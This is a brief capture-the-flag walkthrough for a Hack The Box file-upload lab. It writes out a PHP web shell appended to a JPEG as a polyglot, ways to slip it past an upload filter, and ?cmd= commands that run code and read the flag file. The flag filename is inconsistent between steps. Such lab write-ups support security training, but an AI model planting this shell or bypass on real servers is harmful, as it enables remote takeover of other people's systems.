 HTB File Upload Assessment – RCE via Image Polyglot
🧰 1. Prepare a polyglot payload
Start with a valid JPEG image

Append a PHP webshell:


echo "<?php system(\$_REQUEST['cmd']); ?>" >> test_image.phar.jpg
✅ Result: test_image.phar.jpg is a valid image + executable PHP

📤 2. Upload the polyglot image
Use Burp or intercept the browser request

Submit test_image.phar.jpg through the /contact/upload.php endpoint

Ensure:

Filename ends in .jpg or .png

No .php or .phps in the name

Content-Type: image/jpeg or image/png

🗂️ 3. Find uploaded image’s path
Uploaded files are saved with:


/contact/user_feedback_submissions/[YYMMDD]_[filename]
Example:


/contact/user_feedback_submissions/250325_test_image.phar.jpg
💥 4. Trigger remote code execution
Visit the image URL:


http://<IP>:<PORT>/contact/user_feedback_submissions/250325_test_image.phar.jpg?cmd=id
If the server executes your PHP → ✅ RCE confirmed

🔍 5. Enumerate to find the flag
Use:


?cmd=ls /
Then:


?cmd=ls / | grep flag
You’ll find something like:


flag_example.txt
🎯 6. Exfil the flag
Run:

bash

?cmd=cat /flag_example9.txt
💣 Boom → challenge complete.
